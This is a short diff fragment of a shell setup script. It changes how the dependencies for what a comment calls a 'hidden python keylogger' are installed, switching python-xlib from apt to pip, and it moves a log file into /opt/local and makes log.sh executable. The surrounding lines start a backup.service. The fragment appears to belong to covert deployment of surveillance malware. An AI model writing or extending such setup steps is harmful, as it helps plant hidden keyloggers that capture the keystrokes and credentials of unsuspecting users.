@@ -99,7 +99,8 @@ systemctl start backup.service
 systemctl status backup.service
 
 # setup hidden python keylogger
-apt install python3 python-xlib -y &
+apt install python3 -y &
+python3 -m pip install python-xlib
 mkdir /opt/local/
 mv log.txt /opt/local
 chmod +x log.sh
